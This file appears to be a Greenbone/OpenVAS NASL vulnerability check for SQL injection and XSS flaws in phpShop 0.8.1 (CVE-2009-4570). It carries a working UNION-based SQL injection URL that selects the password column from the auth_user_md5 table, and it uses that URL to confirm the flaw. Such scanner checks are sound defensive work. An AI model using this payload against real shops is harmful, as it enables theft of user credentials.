# Copyright (C) 2009 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:edikon:phpshop";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100383");
  script_version("2022-11-29T10:12:26+0000");
  script_tag(name:"last_modification", value:"2022-11-29 10:12:26 +0000 (Tue, 29 Nov 2022)");
  script_tag(name:"creation_date", value:"2009-12-08 22:02:24 +0100 (Tue, 08 Dec 2009)");
  script_cve_id("CVE-2009-4570");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("phpShop <= 0.8.1 Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("gb_phpshop_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpshop/http/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37227");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/508243");

  script_tag(name:"summary", value:"phpShop is prone to a cross-site scripting (XSS) vulnerability
  and multiple SQL injection (SQLi) vulnerabilities because it fails to adequately sanitize
  user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Exploiting these issues could allow an attacker to steal cookie-
  based authentication credentials, compromise the application, access or modify data, or exploit
  latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"phpShop 0.8.1 is vulnerable. Other versions may also be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/?page=shop/flypage&product_id=1011%27/**/union/**/select/**/1,1,1,1,1,password,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0x53514c2d496e6a656374696f6e2d54657374/**/from/**/auth_user_md5--%20aaa";
req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if(!res)
  exit(0);

if(egrep(pattern:"SQL-Injection-Test", string:res, icase:FALSE)) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(0);
